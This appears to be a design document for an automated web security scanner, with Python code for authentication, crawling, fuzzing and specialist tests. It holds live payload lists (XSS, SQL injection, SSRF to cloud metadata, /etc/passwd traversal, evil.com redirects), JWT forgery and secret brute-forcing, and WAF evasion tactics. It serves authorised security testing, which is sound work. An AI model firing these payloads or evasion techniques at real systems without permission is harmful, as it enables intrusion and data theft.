# AutoPentest — DAST Pipeline Design

## Pipeline Overview

```
Target URL
    │
    ▼
┌─────────────────┐
│  ReconAgent     │  katana crawl, fingerprint, DNS enum
│  (queue.ai)     │  → discovers endpoints, tech stack
└────────┬────────┘
         │
    ┌────▼────────────┐
    │  AuthAgent      │  resolves login, OAuth, JWT, cookies
    │  (queue.ai)     │  → produces auth_result {cookies, headers, tokens}
    └────┬────────────┘
         │
    ┌────▼────────────┐
    │  APIAgent       │  parses OpenAPI/GraphQL/Postman
    │  (queue.ai)     │  → produces structured endpoint list with param types
    └────┬────────────┘
         │
    ┌────▼────────────────────────────────────────────────────────┐
    │  DAST Engine (queue.dast)                                    │
    │                                                              │
    │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐  │
    │  │ Crawler      │  │ Fuzzer       │  │ Specialist Tests │  │
    │  │ (Playwright) │  │ (httpx)      │  │                  │  │
    │  │ JS-aware     │  │ param mutate │  │ JWT, CORS, CSRF  │  │
    │  │ SPAs, SSR    │  │ wordlists    │  │ GraphQL, SSRF    │  │
    │  └──────┬───────┘  └──────┬───────┘  └────────┬─────────┘  │
    │         └─────────────────┴──────────────────┘             │
    │                           │                                  │
    │                    ┌──────▼───────┐                         │
    │                    │ Response     │                         │
    │                    │ Analyzer     │                         │
    │                    │ + Findings   │                         │
    │                    └──────────────┘                         │
    └──────────────────────────────────────────────────────────────┘
         │
    ┌────▼────────────┐
    │ ExploitAgent    │  confirms and escalates candidate findings
    │ (queue.ai)      │  generates PoC evidence
    └─────────────────┘
```

---

## Authentication Flow Handler

The Auth subsystem supports 10 authentication mechanisms. The `AuthAgent` determines which to use (or tries multiple), then produces a standardized `auth_result` that all subsequent DAST components use.

```python
# backend/engines/dast/auth_flow.py
from abc import ABC, abstractmethod
import httpx
from playwright.async_api import async_playwright, BrowserContext

@dataclass
class AuthResult:
    cookies: dict[str, str]
    headers: dict[str, str]       # Authorization header, API key header, etc.
    tokens: dict[str, str]        # jwt, access_token, refresh_token
    auth_type: str
    expires_at: Optional[str]
    is_authenticated: bool
    failure_reason: Optional[str]

class BaseAuthHandler(ABC):
    @abstractmethod
    async def authenticate(self, config: dict) -> AuthResult:
        pass

class SessionLoginHandler(BaseAuthHandler):
    """For form-based login pages."""
    async def authenticate(self, config: dict) -> AuthResult:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            # Navigate to login page
            await page.goto(config["login_url"])

            # Fill credentials
            await page.fill(config["username_selector"], config["username"])
            await page.fill(config["password_selector"], config["password"])

            # Handle TOTP MFA if configured
            if config.get("mfa_type") == "totp":
                import pyotp
                totp = pyotp.TOTP(config["totp_secret"])
                await page.fill(config["mfa_selector"], totp.now())

            # Submit and wait for navigation
            await page.click(config.get("submit_selector", '[type="submit"]'))
            await page.wait_for_load_state("networkidle", timeout=15000)

            # Verify success
            success_indicator = config.get("success_indicator", "")
            if success_indicator and success_indicator not in await page.content():
                return AuthResult(is_authenticated=False,
                                  failure_reason="Login success indicator not found",
                                  cookies={}, headers={}, tokens={}, auth_type="session_login",
                                  expires_at=None)

            # Extract cookies
            cookies = {c["name"]: c["value"] for c in await context.cookies()}
            await browser.close()

            return AuthResult(
                cookies=cookies, headers={}, tokens={},
                auth_type="session_login", is_authenticated=True,
                expires_at=None, failure_reason=None
            )

class JWTHandler(BaseAuthHandler):
    async def authenticate(self, config: dict) -> AuthResult:
        token = config.get("token")
        header_name = config.get("header_name", "Authorization")
        header_value = f"Bearer {token}"
        return AuthResult(
            cookies={},
            headers={header_name: header_value},
            tokens={"access_token": token},
            auth_type="jwt", is_authenticated=True,
            expires_at=None, failure_reason=None
        )

class OAuth2ClientCredentialsHandler(BaseAuthHandler):
    async def authenticate(self, config: dict) -> AuthResult:
        async with httpx.AsyncClient() as client:
            r = await client.post(config["token_url"], data={
                "grant_type": "client_credentials",
                "client_id": config["client_id"],
                "client_secret": config["client_secret"],
                "scope": config.get("scope", ""),
            })
            r.raise_for_status()
            data = r.json()
            token = data["access_token"]
            return AuthResult(
                cookies={}, headers={"Authorization": f"Bearer {token}"},
                tokens=data, auth_type="oauth2_client_credentials",
                is_authenticated=True, expires_at=None, failure_reason=None
            )

class HARImportHandler(BaseAuthHandler):
    """Replay auth flow from a recorded HAR file."""
    async def authenticate(self, config: dict) -> AuthResult:
        import json
        har = json.loads(config["har_content"])
        # Find authentication responses (those that set cookies or return tokens)
        cookies = {}
        headers = {}
        for entry in har["log"]["entries"]:
            for header in entry["response"]["headers"]:
                if header["name"].lower() == "set-cookie":
                    # Parse cookie string
                    name, _, value = header["value"].partition("=")
                    value = value.split(";")[0]
                    cookies[name.strip()] = value.strip()
            # Check for JSON response with token
            response_body = entry["response"].get("content", {}).get("text", "")
            try:
                body = json.loads(response_body)
                if "access_token" in body:
                    headers["Authorization"] = f"Bearer {body['access_token']}"
            except Exception:
                pass

        return AuthResult(
            cookies=cookies, headers=headers, tokens={},
            auth_type="har_import", is_authenticated=bool(cookies or headers),
            expires_at=None, failure_reason=None
        )

AUTH_HANDLER_MAP = {
    "session_login": SessionLoginHandler,
    "jwt": JWTHandler,
    "oauth2_client_credentials": OAuth2ClientCredentialsHandler,
    "api_key": lambda: ApiKeyHandler(),
    "basic": lambda: BasicAuthHandler(),
    "har_import": HARImportHandler,
    "cookie_paste": CookiePasteHandler,
    "custom_headers": CustomHeadersHandler,
    "mtls": mTLSHandler,
}
```

---

## Crawler Design (Playwright-based)

```python
# backend/engines/dast/crawler.py
from playwright.async_api import async_playwright, Page
from urllib.parse import urlparse, urljoin
import re

class DASTCrawler:
    """
    JS-aware crawler for Single Page Applications and Server-Side Rendered apps.
    Uses Playwright to fully render JavaScript and intercept network requests.
    """

    def __init__(self, target_url: str, scope_urls: list[str],
                 auth_result: AuthResult, max_depth: int = 5,
                 requests_per_second: int = 10):
        self.target_url = target_url
        self.scope_urls = scope_urls
        self.auth_result = auth_result
        self.max_depth = max_depth
        self.rps = requests_per_second
        self.discovered_endpoints: list[dict] = []
        self.visited_urls: set[str] = set()
        self._intercepted_requests: list[dict] = []

    async def crawl(self) -> list[dict]:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-web-security",    # Bypass CORS for crawling
                ]
            )

            context = await browser.new_context(
                ignore_https_errors=True,       # Allow self-signed certs
                extra_http_headers=self.auth_result.headers,
            )

            # Set cookies if available
            if self.auth_result.cookies:
                domain = urlparse(self.target_url).netloc
                await context.add_cookies([
                    {"name": k, "value": v, "domain": domain, "path": "/"}
                    for k, v in self.auth_result.cookies.items()
                ])

            page = await context.new_page()

            # Intercept ALL network requests to discover API calls
            async def handle_request(request):
                url = request.url
                if self._is_in_scope(url):
                    self._intercepted_requests.append({
                        "url": url,
                        "method": request.method,
                        "headers": dict(request.headers),
                        "post_data": request.post_data,
                        "resource_type": request.resource_type,
                    })

            page.on("request", handle_request)

            # Crawl breadth-first
            await self._crawl_page(page, self.target_url, depth=0)

            # Also extract endpoints from intercepted XHR/fetch requests
            api_endpoints = self._extract_api_endpoints_from_requests()

            await browser.close()
            return self.discovered_endpoints + api_endpoints

    async def _crawl_page(self, page: Page, url: str, depth: int):
        if url in self.visited_urls or depth > self.max_depth:
            return
        if not self._is_in_scope(url):
            return

        self.visited_urls.add(url)

        try:
            await page.goto(url, wait_until="networkidle", timeout=30000)
        except Exception:
            return

        # Record this endpoint
        self.discovered_endpoints.append({
            "url": url,
            "method": "GET",
            "source": "crawl",
            "depth": depth
        })

        # Extract all links for further crawling
        links = await page.eval_on_selector_all(
            "a[href]",
            "elements => elements.map(e => e.href)"
        )

        # Extract form endpoints
        forms = await page.eval_on_selector_all(
            "form",
            """forms => forms.map(f => ({
                action: f.action,
                method: f.method || 'GET',
                inputs: Array.from(f.elements).map(e => ({name: e.name, type: e.type}))
            }))"""
        )
        for form in forms:
            if form["action"] and self._is_in_scope(form["action"]):
                self.discovered_endpoints.append({
                    "url": form["action"],
                    "method": form["method"].upper(),
                    "source": "form",
                    "parameters": form["inputs"]
                })

        # Extract endpoints from inline JavaScript
        js_endpoints = await self._extract_js_endpoints(page)
        self.discovered_endpoints.extend(js_endpoints)

        # Recurse into discovered links
        import asyncio
        for link in links[:50]:  # Cap at 50 links per page to control breadth
            await asyncio.sleep(1.0 / self.rps)  # Rate limiting
            await self._crawl_page(page, link, depth + 1)

    async def _extract_js_endpoints(self, page: Page) -> list[dict]:
        """Extract API endpoint paths from inline JS and source files."""
        scripts = await page.eval_on_selector_all(
            "script:not([src])",
            "scripts => scripts.map(s => s.textContent)"
        )
        endpoints = []
        API_PATH_PATTERN = re.compile(
            r'[\'"`](/api/[a-zA-Z0-9/_?=&{}\-:]+)[\'"`]'
        )
        for script in scripts:
            for match in API_PATH_PATTERN.finditer(script):
                path = match.group(1)
                full_url = urljoin(self.target_url, path)
                if self._is_in_scope(full_url):
                    endpoints.append({"url": full_url, "method": "GET", "source": "js_extraction"})
        return endpoints

    def _is_in_scope(self, url: str) -> bool:
        return any(url.startswith(scope) for scope in self.scope_urls)

    def _extract_api_endpoints_from_requests(self) -> list[dict]:
        """Turn intercepted XHR/fetch requests into endpoint discoveries."""
        seen = set()
        endpoints = []
        for req in self._intercepted_requests:
            if req["resource_type"] in ("xhr", "fetch") and req["url"] not in seen:
                seen.add(req["url"])
                endpoints.append({
                    "url": req["url"],
                    "method": req["method"],
                    "source": "xhr_intercept",
                    "headers": req["headers"],
                })
        return endpoints
```

---

## Fuzzing Engine

```python
# backend/engines/dast/fuzzer.py
class DASTFuzzer:
    """
    Tests discovered endpoints for vulnerabilities using curated payload libraries
    and AI-generated context-aware payloads.
    """

    PAYLOAD_LIBRARY = {
        "xss": [
            '<script>alert(1)</script>',
            '"><svg onload=alert(1)>',
            "javascript:alert(1)",
            '<img src=x onerror=alert(1)>',
            '{{7*7}}',            # SSTI test
            "${7*7}",             # SSTI test (Java/JSP)
        ],
        "sqli": [
            "' OR '1'='1",
            "' OR 1=1--",
            "1; SELECT SLEEP(5)--",   # Time-based blind
            "1' WAITFOR DELAY '0:0:5'--",  # MSSQL time-based
            "1 AND 1=1",
            "1 AND 1=2",
            "' UNION SELECT null,null,null--",
        ],
        "ssrf": [
            "http://169.254.169.254/latest/meta-data/",  # AWS IMDSv1
            "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
            "http://metadata.google.internal/",          # GCP
            "http://localhost:80",
            "http://0.0.0.0:22",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
        ],
        "ssti": [
            "{{7*7}}",
            "{{7*'7'}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{self}}",
        ],
        "lfi": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
        ],
        "open_redirect": [
            "//evil.com",
            "https://evil.com",
            "/\\evil.com",
            "javascript://evil.com/%0aalert(1)",
        ],
    }

    async def fuzz_endpoint(
        self,
        endpoint: dict,
        auth_result: AuthResult,
        vuln_types: list[str] = None,
        rate_limit: int = 10,  # req/s
    ) -> list[dict]:
        """
        Returns list of candidate findings (not yet confirmed).
        ExploitAgent confirms and escalates these.
        """
        if vuln_types is None:
            vuln_types = list(self.PAYLOAD_LIBRARY.keys())

        # Get baseline response
        baseline = await self._request(endpoint, auth_result)
        candidates = []

        for vuln_type in vuln_types:
            for payload in self.PAYLOAD_LIBRARY.get(vuln_type, []):
                for param in endpoint.get("parameters", []):
                    result = await self._test_payload(
                        endpoint=endpoint,
                        param=param,
                        payload=payload,
                        auth_result=auth_result,
                        baseline=baseline
                    )
                    if result.get("signal"):
                        candidates.append({
                            "endpoint_url": endpoint["url"],
                            "method": endpoint["method"],
                            "parameter": param["name"],
                            "payload": payload,
                            "vuln_type": vuln_type,
                            "signal": result["signal"],
                            "evidence": result
                        })
                    await asyncio.sleep(1.0 / rate_limit)

        return candidates

    async def _test_payload(self, endpoint, param, payload, auth_result, baseline) -> dict:
        """Test a single payload and analyze the response for signals."""
        result = await self._request(endpoint, auth_result, override_param={
            "name": param["name"],
            "location": param.get("location", "query"),
            "value": payload
        })

        signals = {}

        # 1. Error message leakage
        error_type = self._detect_error(result["body"])
        if error_type:
            signals["error_leak"] = error_type

        # 2. Time delay (blind injection)
        if result["elapsed_ms"] > baseline["elapsed_ms"] * 2 and result["elapsed_ms"] > 2000:
            signals["time_delay"] = result["elapsed_ms"]

        # 3. Response size anomaly
        size_delta = abs(len(result["body"]) - len(baseline["body"]))
        if size_delta > max(500, len(baseline["body"]) * 0.5):
            signals["size_anomaly"] = size_delta

        # 4. XSS reflection
        if payload in result["body"] and "xss" in payload.lower():
            signals["xss_reflection"] = True

        # 5. SSRF success indicators
        SSRF_INDICATORS = ["ami-id", "instance-id", "computeMetadata", "iam/security-credentials"]
        for indicator in SSRF_INDICATORS:
            if indicator in result["body"]:
                signals["ssrf_confirmed"] = indicator

        return {"signal": signals if signals else None, **result}
```

---

## DAST Specialist Tests

### JWT Attack Tests

```python
# backend/engines/dast/jwt_tester.py
import base64, json, hmac, hashlib

class JWTTester:
    async def test_alg_none(self, token: str, endpoint: str, client) -> dict:
        """Test alg:none bypass — set algorithm to 'none', remove signature."""
        parts = token.split(".")
        if len(parts) != 3:
            return {"vulnerable": False, "reason": "Invalid JWT format"}

        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b"=").decode()

        forged_token = f"{new_header}.{parts[1]}."  # Empty signature
        response = await client.get(endpoint, headers={"Authorization": f"Bearer {forged_token}"})
        return {
            "vulnerable": response.status_code < 400,
            "attack": "alg:none",
            "status_code": response.status_code
        }

    async def test_weak_secret(self, token: str, endpoint: str, client) -> dict:
        """Brute-force JWT secret using common secret wordlist."""
        COMMON_SECRETS = ["secret", "password", "key", "jwt", "token", "test", "admin",
                          "123456", "changeme", "", "secret123"]
        parts = token.split(".")
        header_payload = f"{parts[0]}.{parts[1]}"

        for secret in COMMON_SECRETS:
            expected_sig = hmac.new(
                secret.encode(), header_payload.encode(), hashlib.sha256
            ).digest()
            expected_b64 = base64.urlsafe_b64encode(expected_sig).rstrip(b"=").decode()
            if expected_b64 == parts[2]:
                return {"vulnerable": True, "attack": "weak_secret", "secret": secret}

        return {"vulnerable": False, "attack": "weak_secret"}
```

### GraphQL Abuse Tests

```python
# backend/engines/dast/graphql_tester.py
class GraphQLTester:
    async def test_introspection(self, endpoint: str, headers: dict) -> dict:
        """Check if introspection is enabled (information disclosure)."""
        async with httpx.AsyncClient() as client:
            r = await client.post(endpoint, json={
                "query": "{ __schema { types { name } } }"
            }, headers=headers)
            enabled = r.status_code == 200 and "__schema" in r.text
            return {"introspection_enabled": enabled, "response": r.text[:500]}

    async def test_query_batching(self, endpoint: str, headers: dict) -> dict:
        """Test batch queries for rate limit bypass."""
        batch = [{"query": "{ me { id } }"} for _ in range(100)]
        async with httpx.AsyncClient() as client:
            r = await client.post(endpoint, json=batch, headers=headers)
            return {"batching_allowed": r.status_code == 200, "batch_size": 100}

    async def test_field_suggestions(self, endpoint: str, headers: dict) -> dict:
        """GraphQL field suggestions can reveal schema even without introspection."""
        async with httpx.AsyncClient() as client:
            r = await client.post(endpoint, json={
                "query": "{ sys { user { adm } } }"  # Intentional typo
            }, headers=headers)
            # If response contains "Did you mean" — schema is disclosed
            has_suggestions = "Did you mean" in r.text
            return {"field_suggestions_enabled": has_suggestions}
```

---

## CORS Misconfiguration Detection

```python
# backend/engines/dast/cors_tester.py
EVIL_ORIGINS = [
    "https://evil.com",
    "null",
    "https://trusted.evil.com",     # Test prefix matching
    "https://trustedapp.evil.com",  # Test suffix matching
]

async def test_cors(endpoint: str, auth_headers: dict) -> dict:
    findings = []
    async with httpx.AsyncClient() as client:
        for origin in EVIL_ORIGINS:
            r = await client.options(endpoint,
                                     headers={**auth_headers, "Origin": origin})
            acao = r.headers.get("access-control-allow-origin", "")
            acac = r.headers.get("access-control-allow-credentials", "false")

            if acao == origin or acao == "*":
                severity = "high" if acac.lower() == "true" else "medium"
                findings.append({
                    "vulnerable": True,
                    "origin_reflected": origin,
                    "allow_credentials": acac,
                    "severity": severity,
                    "description": f"CORS allows origin {origin} with credentials={acac}"
                })
    return findings
```

---

## Pause/Resume State Machine

```
States: pending → queued → running → paused → running → completed
                                   ↓                   ↓
                                failed              cancelled

Pause behavior:
1. API receives POST /scans/{id}/pause
2. Sets scan.status = 'paused' in DB
3. Sets Redis key scan:pause:{scan_id} = "1"
4. Running workers poll this key every N requests (configurable, default: after each page/endpoint)
5. On detection: workers drain current operation, save checkpoint to scan_checkpoints, exit
6. Last checkpoint saved: {phase, current_endpoint_index, tested_payloads_count, auth_state}

Resume behavior:
1. API receives POST /scans/{id}/resume
2. Deletes Redis key scan:pause:{scan_id}
3. Sets scan.status = 'running'
4. Dispatches new Celery task chain starting from checkpoint phase
5. New task reads checkpoint, restores AgentContext, continues from saved position
```

```python
# backend/engines/dast/pause_check.py
class PauseCheckMixin:
    """Mixin for DAST workers to check for pause signal."""
    CHECK_INTERVAL = 10  # Check every 10 requests

    def __init__(self, scan_id: str, redis_client):
        self.scan_id = scan_id
        self.redis = redis_client
        self._request_count = 0

    async def check_pause(self) -> bool:
        """Returns True if scan should pause. Workers call this periodically."""
        self._request_count += 1
        if self._request_count % self.CHECK_INTERVAL != 0:
            return False
        return bool(await self.redis.get(f"scan:pause:{self.scan_id}"))

    async def save_checkpoint(self, phase: str, state: dict, db):
        from backend.models.scan import ScanCheckpoint
        # Upsert checkpoint
        await db.merge(ScanCheckpoint(
            scan_id=self.scan_id,
            phase=phase,
            state=state
        ))
        await db.commit()
```

---

## WAF Detection and Evasion

```python
# backend/engines/dast/waf_handler.py
WAF_FINGERPRINTS = {
    "cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
    "aws_waf": ["x-amzn-requestid", "x-amz-apigw"],
    "akamai": ["x-akamai-request-id", "akamaighost"],
    "imperva": ["x-cdn", "incap_ses"],
    "f5_big_ip": ["bigipserver", "x-cnection"],
}

class WAFHandler:
    async def detect(self, url: str) -> Optional[str]:
        async with httpx.AsyncClient() as client:
            r = await client.get(url)
            headers_str = str(dict(r.headers)).lower()
            body_lower = r.text.lower()
            for waf_name, fingerprints in WAF_FINGERPRINTS.items():
                if any(fp in headers_str or fp in body_lower for fp in fingerprints):
                    return waf_name
        return None

    def get_evasion_strategy(self, waf_name: str) -> dict:
        """Returns recommended evasion config for detected WAF."""
        STRATEGIES = {
            "cloudflare": {
                "delay_between_requests_ms": 2000,
                "rotate_user_agents": True,
                "chunk_payloads": True,       # Split payloads across params
                "use_case_variations": True,   # sElEcT instead of SELECT
            },
            "aws_waf": {
                "delay_between_requests_ms": 1000,
                "url_encode_payloads": True,
                "add_random_params": True,
            },
        }
        return STRATEGIES.get(waf_name, {"delay_between_requests_ms": 500})
```
